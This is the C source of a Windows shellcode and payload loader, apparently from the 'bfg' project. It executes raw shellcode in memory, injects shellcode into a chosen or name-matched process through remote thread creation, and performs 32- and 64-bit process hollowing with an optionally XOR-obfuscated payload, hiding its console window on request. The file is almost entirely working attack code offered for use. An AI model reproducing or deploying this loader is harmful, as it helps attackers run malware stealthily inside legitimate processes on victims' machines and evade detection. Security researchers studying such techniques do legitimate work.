/*
Author: Daniel Sauder
License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
Web: https://github.com/govolution/bfg
*/

//     "         .==,_                                          \n"
//     "        .===,_`\\                                        \n"
//     "      .====,_ ` \\      .====,__                         \n"
//     "---     .==-,`~. \\           `:`.__,                    \n"
//     " ---      `~~=-.  \\           /^^^     MEEP MEEP        \n"
//     "   ---       `~~=. \\         /                          \n"
//     "                `~. \\       /                           \n"
//     "                  ~. \\____./                            \n"
//     "                    `.=====)                            \n"
//     "                 ___.--~~~--.__                         \n"
//     "       ___\\.--~~~              ~~~---.._|/              \n"
//     "       ~~~\\\"                             /              \n"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include <winternl.h>
#include "defs.h"
#ifdef IMAGE
#include <psapi.h>
#endif

int get_filesize(char *fvalue);
unsigned char* load_file(char *fvalue, unsigned char *buf, int size2);
void exec_shellcode(unsigned char *shellcode);
void exec_shellcode64(unsigned char *shellcode);
#ifdef INJECT_SHELLCODE
DWORD inject_sc_process(unsigned char *shellcode, DWORD pid);
#endif
#ifdef IMAGE
DWORD get_pid_by_name(char *imgname);
#endif
#ifdef PROCESS_HOLLOWING
typedef LONG (WINAPI *NtUnmapViewOfSection) (HANDLE ProcessHandle, PVOID BaseAddress);
void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine);
#endif

int main (int argc, char **argv)
{
	#ifdef QUIET
		ShowWindow(GetConsoleWindow(), SW_HIDE);
	#endif
		
	char *fvalue = NULL;

	int index;
	int c;

	opterr = 0;

	#ifdef LVALUE
		fvalue=argv[1];
	#endif

	#ifdef PRINT_DEBUG
		printf ("fvalue = %s ", fvalue);
		for (index = optind; index < argc; index++)
			printf ("Non-option argument %s\n", argv[index]);
	#endif

// compute #defines from defs.h
#ifdef FVALUE
	int size = strlen(FVALUE);
	fvalue=(char*)malloc(size);
	strcpy(fvalue,FVALUE);
#endif

	// exec shellcode from a given file or from defs.h
	if (fvalue)
	{
		unsigned char *buffer;
		unsigned char *shellcode;
		int size;
//#ifndef FVALUE
#ifdef LVALUE
	#ifdef PRINT_DEBUG
		printf("exec shellcode from file\n");
	#endif
		size = get_filesize(fvalue);
		buffer = load_file(fvalue, buffer, size);
		//shellcode=buffer;
		unsigned char *buf =buffer;
#endif
	#ifdef FVALUE
		size = strlen (FVALUE);
		buffer = FVALUE;
	#endif

	//TODO: clean that
	#ifndef LOADEXEC_DLL
	#ifndef PROCESS_HOLLOWING
		#ifndef ENCRYPT
			#ifndef ASCIIMSF 
				#ifdef PRINT_DEBUG
				printf("exec shellcode without decode_shellcode\n");
				#endif
				shellcode = buf;	//buf is from defs.h if shellcode is included
			#endif
		#endif
	#endif
	#endif
	
	#ifndef INJECT_SHELLCODE
	#ifndef X64 
		exec_shellcode(shellcode);
	#endif
	#ifdef X64
		exec_shellcode64(shellcode);
	#endif
	#endif
	
	#ifdef INJECT_SHELLCODE
	#ifndef IMAGE
		int tmp;
		#ifndef LVALUE
			tmp=atoi(argv[1]);
		#endif
		#ifdef LVALUE
			tmp=atoi(argv[2]);
		#endif
		inject_sc_process(shellcode, tmp);
	#endif
	#endif
	
	#ifdef IMAGE
	#ifdef INJECT_SHELLCODE
		printf("Imagename to search: %s\n", IMAGE); 
		int tmp=get_pid_by_name(IMAGE);
		#ifdef PRINT_DEBUG
			printf("PID %d\n", tmp);
		#endif
		inject_sc_process(shellcode, tmp);	
	#endif
	#endif
	}
	
	#ifdef PROCESS_HOLLOWING
		#ifdef XOR_OBFUSCATION
			// Decrypt payload
			// (payloadSize, keyByte and payload specified in defs.h by make_bfg)
			for(long i=0; i < payloadSize; i++)
			{
				payload[i] = payload[i] ^ keyByte;
			}	
		#endif
	
		// Instanciate target process
		// Target process specified in first bfg argument argv[1]	
		// Command line arguments for payload in second bfg argument argv[2]
		if(!argv[2]) 
		{
			// Handle empty command line arguments for payload executable
			// Relevant if user does not specify "" as second bfg argument
			newRunPE(argv[1], payload, "");
		} else
		{
			// Instanciate and pass command line arguments
			newRunPE(argv[1], payload, argv[2]);
		}	
	#endif

	#ifdef LOADEXEC_DLL
	HANDLE hModule = LoadLibrary(argv[1]);
	#endif

	return 0;
}


#if defined(LVALUE) || defined(UVALUE)
int get_filesize(char *fvalue)
{
	int size,rc1;
	FILE *fp1 = fopen(fvalue, "rb");
	if (fp1 == NULL)
	{
		printf("get_filesize, %s not found\n", fvalue);
		return 0;
	}
	for (size = 0; (rc1 = getc(fp1)) != EOF; size++) {}
	fclose(fp1);
	
	#ifdef PRINT_DEBUG
		printf("get_filesize, filesize %s: %d\n", fvalue, size);
	#endif

	return size;
}
#endif

#if defined(LVALUE) || defined(UVALUE)
// return pointer to text buffer
unsigned char* load_file(char *fvalue, unsigned char *buffer, int size)
{
	#ifdef PRINT_DEBUG
		printf("load_file called: fvalue: %s, size: %d\n", fvalue, size);
	#endif

	//allocate buffer, open file, read file to the buffer, close the file
	buffer=(unsigned char*)malloc(size+1);
	int i, rc;

	for (i=0; i<size; i++)
		buffer[i]=0x0;

	FILE *fp = fopen(fvalue, "rb");
	if (fp == NULL)
	{
		printf("load_file, %s not found\n", fvalue);
		return 0;
	}

	for (i=0; i<size; i++)
	{
		rc = getc(fp);
		buffer[i] = rc;
	}

	#ifdef PRINT_DEBUG
		printf("%s\n",buffer);
	#endif

	fclose(fp);
	return buffer;
}
#endif


#ifndef X64
void exec_shellcode(unsigned char *shellcode)
{
	#ifdef PRINT_DEBUG
		printf("exec_shellcode\n ");
		int size=strlen(shellcode);
		printf("shellcode size: %d\n", size);
	#endif

	int (*funct)();
	funct = (int (*)()) shellcode;
	(int)(*funct)();
}
#endif


#ifdef X64
void exec_shellcode64(unsigned char *shellcode)
{
#ifdef PRINT_DEBUG
	printf("exec_shellcode64\n ");
	int size=strlen(shellcode);
	printf("shellcode size: %d\n", size);
#endif
	int len=strlen(shellcode);
	DWORD l=0;
	VirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&l);
	(* (int(*)()) shellcode)();
}
#endif

#ifdef INJECT_SHELLCODE
#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
DWORD inject_sc_process(unsigned char *shellcode, DWORD pid)
{
	PBYTE pShellcode = shellcode;
	SIZE_T szShellcodeLength = strlen(shellcode);
	HANDLE hProc;
	HANDLE hRemoteThread;
	PVOID pRemoteBuffer;
	DWORD dwProcessID = pid;

	if(!dwProcessID) {
		return 1;
	}
	hProc = OpenProcess(CREATE_THREAD_ACCESS, FALSE, dwProcessID);
	if(!hProc) {
		return 2;
	}

	pRemoteBuffer = VirtualAllocEx(hProc, NULL, szShellcodeLength, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (!pRemoteBuffer) {
		return 4;
	}
	if (!WriteProcessMemory(hProc, pRemoteBuffer, pShellcode, szShellcodeLength, NULL)) {
		return 5;
	}

	hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
	if (!hRemoteThread) {
		return 6;
	}
	CloseHandle(hProc);

	return 0;	
}
#endif

#ifdef IMAGE
DWORD get_pid_by_name(char *imgname)
{
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;

	if ( !EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) )
	{
		return -1;
	}

	cProcesses = cbNeeded / sizeof(DWORD);

	for ( i = 0; i < cProcesses; i++ )
	{
		if( aProcesses[i] != 0 )
		{
			DWORD processID = aProcesses[i];
			TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

			HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION |
					PROCESS_VM_READ,
					FALSE, processID );

			if (NULL != hProcess )
			{
				HMODULE hMod;
				DWORD cbNeeded;

				if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), 
							&cbNeeded) )
				{
					GetModuleBaseName( hProcess, hMod, szProcessName, 
							sizeof(szProcessName)/sizeof(TCHAR) );
				}
			}


			if (strcmp(szProcessName,IMAGE) == 0)
			{
				CloseHandle( hProcess );
				return processID;
			}

			CloseHandle( hProcess );
		}
	}

	return -2;
}
#endif

#ifdef PROCESS_HOLLOWING
void newRunPE(LPSTR targetPath, PVOID payloadData, LPTSTR commandLine) {
	#ifndef X64
		STARTUPINFOA targetStartupInfo;
		PROCESS_INFORMATION targetProcessInfo;	
		NtUnmapViewOfSection callNtUnmapViewOfSection;
		PIMAGE_DOS_HEADER payloadDosHeader;
		PIMAGE_NT_HEADERS payloadNtHeader;
		PIMAGE_SECTION_HEADER payloadSectionHeader;
		DWORD targetImageBase;
		PCONTEXT targetContext;

		// Init info structures for target process instanciation
		RtlZeroMemory(&targetStartupInfo, sizeof(targetStartupInfo));
		RtlZeroMemory(&targetProcessInfo, sizeof(targetProcessInfo));	

		// Create new instance of target process
		if(!CreateProcessA(targetPath, commandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &targetStartupInfo, &targetProcessInfo)) {
			printf("Failed to create target process.\n");
			return;
		} else {
			printf("Target process instanciated.\n");
		}

		// Get thread context of target process
		targetContext = (PCONTEXT) VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
		if(targetContext == NULL) {
			printf("Failed to allocate memory for target process context.\n");
			return;
		} else {
			printf("Allocated memory for target process context.\n");
		}
		targetContext->ContextFlags = CONTEXT_FULL;
		if(GetThreadContext(targetProcessInfo.hThread, (LPCONTEXT) targetContext) == 0) {
			printf("GetThreadContext for target process main thread failed.\n");
		} else {
			printf("Retrieved target main thread context.\n");
		}	

		// Get payload headers
		payloadDosHeader = (PIMAGE_DOS_HEADER) payloadData;
		payloadNtHeader = (PIMAGE_NT_HEADERS) ((BYTE *) payloadDosHeader + payloadDosHeader->e_lfanew);	

		// Patch payload subsystem to avoid crashes
		payloadNtHeader->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;	

		// Get target process image base
		ReadProcessMemory(targetProcessInfo.hProcess, (LPCVOID) (targetContext->Ebx + 8), (LPVOID) (&targetImageBase), sizeof(DWORD), NULL);	
		printf("Old target process image base is 0x%08X\n", targetImageBase);	

		// Unmap old target process image
		callNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
		callNtUnmapViewOfSection(targetProcessInfo.hProcess, (PVOID) targetImageBase);
		printf("Unmapped old target process image.\n");

		// Allocate new memory in target process
		targetImageBase = (DWORD) VirtualAllocEx(targetProcessInfo.hProcess, (LPVOID) payloadNtHeader->OptionalHeader.ImageBase, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		if(targetImageBase == 0) {
			printf("Failed to allocate new memory in target process.\n");
			printf("Error code is 0x%x\n", GetLastError());
			return;
		} else {
			printf("Allocated new memory in target process at 0x%08X. This is the new image base.\n");
		}

		// Write payload headers and sections into target memory
		WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) targetImageBase, (LPCVOID) payloadData, payloadNtHeader->OptionalHeader.SizeOfHeaders, NULL);
		printf("Wrote payload headers to target process.\n");

		for (int i = 0; i < payloadNtHeader->FileHeader.NumberOfSections; i++) {
			payloadSectionHeader = (PIMAGE_SECTION_HEADER) ((BYTE *) payloadData + payloadDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
			WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) ((BYTE *) targetImageBase + payloadSectionHeader->VirtualAddress), (LPCVOID)((BYTE *) payloadData + payloadSectionHeader->PointerToRawData), payloadSectionHeader->SizeOfRawData, NULL);
			printf("Wrote section %d to target process, section start address is 0x%08X\n", i, (BYTE *) targetImageBase + payloadSectionHeader->VirtualAddress);
		}

		// Write new target image base into target PEB
		WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) (targetContext->Ebx + 8), (LPCVOID) &targetImageBase, sizeof(DWORD), NULL);
		printf("Fixed target image base to 0x%08x\n", targetImageBase);

		// Modify entry point to execute the copied payload
		targetContext->Eax = targetImageBase + payloadNtHeader->OptionalHeader.AddressOfEntryPoint;
		if(!SetThreadContext(targetProcessInfo.hThread, targetContext)) {
			printf("Setting thread context for target main thread failed.\n");
			return;
		} else {
			printf("Set thread context for target main thread.\n");
		}

		// Resume target main threads
		if(ResumeThread(targetProcessInfo.hThread) == -1) {
			printf("Failed to resume target main thread.\n");
		} else {
			printf("Resumed target main thread.\n");
		}
	#endif
	
	#ifdef X64		
		STARTUPINFOA targetStartupInfo;
		PROCESS_INFORMATION targetProcessInfo;	
		NtUnmapViewOfSection callNtUnmapViewOfSection;
		PIMAGE_DOS_HEADER payloadDosHeader;
		PIMAGE_NT_HEADERS payloadNtHeader;
		PIMAGE_SECTION_HEADER payloadSectionHeader;
		DWORD64 targetImageBase;
		PCONTEXT targetContext;

		// Init info structures for target process instanciation
		RtlZeroMemory(&targetStartupInfo, sizeof(targetStartupInfo));
		RtlZeroMemory(&targetProcessInfo, sizeof(targetProcessInfo));	

		// Create new instance of target process
		if(!CreateProcessA(targetPath, commandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &targetStartupInfo, &targetProcessInfo)) {
			printf("Failed to create target process.\n");
			return;
		} else {
			printf("Target process instanciated.\n");
		}

		// Get thread context of target process
		targetContext = (PCONTEXT) VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
		if(targetContext == NULL) {
			printf("Failed to allocate memory for target process context.\n");
			return;
		} else {
			printf("Allocated memory for target process context.\n");
		}
		targetContext->ContextFlags = CONTEXT_FULL;
		if(GetThreadContext(targetProcessInfo.hThread, (LPCONTEXT) targetContext) == 0) {
			printf("GetThreadContext for target process main thread failed.\n");
		} else {
			printf("Retrieved target main thread context.\n");
		}	

		// Get payload headers
		payloadDosHeader = (PIMAGE_DOS_HEADER) payloadData;
		payloadNtHeader = (PIMAGE_NT_HEADERS) ((BYTE *) payloadDosHeader + payloadDosHeader->e_lfanew);	

		// Patch payload subsystem to avoid crashes
		payloadNtHeader->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;	

		// Get target process image base
		ReadProcessMemory(targetProcessInfo.hProcess, (LPCVOID) (targetContext->Rdx + 16), (LPVOID) (&targetImageBase), sizeof(PVOID), NULL);		
		printf("Desired image base is:   0x%16X\n", payloadNtHeader->OptionalHeader.ImageBase);	
		printf("Actual target process image base is 0x%08X\n", targetImageBase);	

		// Unmap old target process image
		callNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
		callNtUnmapViewOfSection(targetProcessInfo.hProcess, (PVOID) targetImageBase);
		printf("Unmapped old target process image.\n");

		// Allocate new memory in target process
		targetImageBase = (DWORD64) VirtualAllocEx(targetProcessInfo.hProcess, (LPVOID) payloadNtHeader->OptionalHeader.ImageBase, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		if(targetImageBase == 0) {
			printf("Failed to allocate new memory in target process.\n");
			printf("Error code is 0x%x\n", GetLastError());
			return;
		} else {
			printf("Allocated new memory in target process at 0x%08X. This is the new image base.\n");
		}

		// Write payload headers and sections into target memory
		WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) targetImageBase, (LPCVOID) payloadData, payloadNtHeader->OptionalHeader.SizeOfHeaders, NULL);
		printf("Wrote payload headers to target process.\n");

		for (int i = 0; i < payloadNtHeader->FileHeader.NumberOfSections; i++) {
			payloadSectionHeader = (PIMAGE_SECTION_HEADER) ((BYTE *) payloadData + payloadDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
			WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) ((BYTE *) targetImageBase + payloadSectionHeader->VirtualAddress), (LPCVOID)((BYTE *) payloadData + payloadSectionHeader->PointerToRawData), payloadSectionHeader->SizeOfRawData, NULL);
			printf("Wrote section %d to target process, section start address is 0x%08X\n", i, (BYTE *) targetImageBase + payloadSectionHeader->VirtualAddress);
		}

		// Write new target image base into target PEB
		WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) (targetContext->Rdx + 16), (LPCVOID) &targetImageBase, sizeof(PVOID), NULL);
		printf("Fixed target image base to 0x%08x\n", targetImageBase);

		// Modify entry point to execute the copied payload
		targetContext->Rcx = targetImageBase + payloadNtHeader->OptionalHeader.AddressOfEntryPoint;
		if(!SetThreadContext(targetProcessInfo.hThread, targetContext)) {
			printf("Setting thread context for target main thread failed.\n");
			return;
		} else {
			printf("Set thread context for target main thread.\n");
		}

		// Resume target main threads
		if(ResumeThread(targetProcessInfo.hThread) == -1) {
			printf("Failed to resume target main thread.\n");
		} else {
			printf("Resumed target main thread.\n");
		}	
	#endif
}
#endif

